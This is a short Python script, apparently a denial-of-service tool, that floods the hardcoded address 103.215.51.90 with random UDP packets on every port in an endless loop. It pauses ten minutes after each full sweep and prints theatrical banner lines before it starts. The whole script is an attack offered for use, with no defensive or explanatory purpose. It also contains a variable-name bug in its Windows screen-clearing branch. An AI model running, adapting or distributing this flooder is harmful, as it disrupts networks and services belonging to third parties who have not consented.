
# Import.
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet


# Platform info
uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
port = 1


# Starting working.
os.system(cmd_clear)
print('\033[1;34mTo all of my children in whom Life flows abundant...')
time.sleep(1)
print('\033[1;34mTo all of my children to whom Death hath passed his judgement...')
time.sleep(1)
print('\033[1;34mThe soul yearns for honor, and the flesh the hereafter...')
time.sleep(1)
print('\033[1;34mLook to those who walked before to lead those who walk after...')
time.sleep(2)
print('\033[1;34mHear...Feel...Think...')
time.sleep(1)
print('\033[1;36mGO!')
time.sleep(1)

sent = 0

if port_mode == False:  # All ports.
    try:
        while True:
            if port == 65534:
                port = 1
                print("\033[32;1mSented 65535 packets to 103.215.51.90 through port:All\033[0m")
                print('\033[1;34mWait 10 min')
                time.sleep(600)
                

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (str("103.215.51.90"), port))
            sent += 1
            port += 1
            
    except:
        print('\n\033[31;1mExited\033[0m')

